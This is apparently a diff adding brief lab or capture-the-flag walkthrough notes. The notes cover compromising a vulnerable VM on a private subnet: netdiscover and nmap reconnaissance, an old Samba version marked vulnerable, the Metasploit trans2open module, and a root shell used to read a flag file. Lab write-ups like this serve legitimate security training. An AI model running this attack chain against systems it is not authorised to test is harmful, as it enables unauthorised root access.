@@ -1,0 +1,7 @@
+1. netdiscover -r 192.168.100.0/24
+2. Target: 192.168.100.7
+3. nmap -sV - sC -O -A 192.168.100.7
+4. Samba 2.2.x vulnerable
+5. msfconsole -> trans2open
+6. sessions -i 1 -> root
+7. cat /usr/sbin/rootflags
